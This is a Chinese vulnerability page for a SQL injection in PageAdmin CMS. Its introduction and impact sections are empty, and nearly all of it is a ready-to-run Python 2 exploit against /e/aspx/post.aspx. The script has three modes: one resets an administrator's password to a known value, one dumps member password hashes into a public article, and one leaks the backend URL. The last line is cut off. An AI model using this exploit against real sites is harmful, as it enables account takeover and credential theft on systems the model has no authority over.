PageMyAdmin sql注入漏洞
=======================

一、漏洞简介
------------

二、漏洞影响
------------

三、复现过程
------------

### poc

    #!/usr/bin/env python
    # -*- coding: utf-8 -*-


    import urllib2
    import urllib
    import re
    import sys

    def main():
        url=sys.argv[1]+"/e/aspx/post.aspx"
        fun=sys.argv[2]
        if fun=='upass':
            update(url)
        elif fun=='sqlinject':
            sqlinject(url)
        elif fun=='Backstage':
            Backstage(url)
        else:
            print'''
            usage: pageadminsql.py http://www.baidu.com/ upass
            parameter: uppass sqlinject Backstage
            '''
    def update(url):
        headers = {"User-Agent":"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0","Referer":url+"?a=pageadmin_cms"}
        formate={
        "siteid":"1",
        "formtable":"1",
        "thedata":'[u][k]pa_member[k][s][k]userpassword="1527f10a11de5efea4b8516213413c103df55126"[k]where[k]id=2'
        }
        postdata = urllib.urlencode(formate)
        request = urllib2.Request(url, data=postdata, headers = headers)
        try:
            response = urllib2.urlopen(request)
            if response.getcode()==200:
                print u">>>>>>修改密码成功 修改密码：admin_1234213<<<<<<"
                pass
        except Exception as e:
            print u">>>>>>修改密码失败<<<<<<"
            pass
    def sqlinject(url):
        headers = {"User-Agent":"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0","Referer":url+"?a=pageadmin_cms"}
        formate={
        "siteid":"1",
        "formtable":"1",
        "thedata":"[u][k]article,pa_member[k][s][k]article.title=pa_member.userpassword[k]where[k]article.id=747"
        }
        postdata = urllib.urlencode(formate)
        request = urllib2.Request(url, data=postdata, headers = headers)
        try:
            response = urllib2.urlopen(request)
            if response.getcode()==200:
                print u">>>>>>密码注入成功 查看密码地址：{0}/index.aspx?lanmuid=63&sublanmuid=654&id=747<<<<<<".format(sys.argv[1])
                pass
        except Exception as e:
            print u">>>>>>密码注入失败<<<<<<"
            pass
    def Backstage(url):
        headers = {"User-Agent":"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0","Referer":url+"?a=pageadmin_cms"}
        formate={
        "siteid":"1",
        "formtable":"1",
        "thedata":"[u][k]article,pa_log[k][s][k]article.title=pa_log.url[k]where[k]article.id=747"
        }
        postdata = urllib.urlencode(formate)
        request = urllib2.Request(url, data=postdata, headers = headers)
        try:
            response = urllib2.urlopen(request)
            if response.getcode()==200:
                print u">>>>>>后台地址注入成功 查看后台地址：{0}/index.aspx?lanmuid=63&sublanmuid=654&id=747<<<<<<".format(sys.argv[1])
                pass
        except Exception as e:
            print u">>>>>>后台地址注入失败<<<<<<"
            pass
    if __name__ == '__main__':
        main(
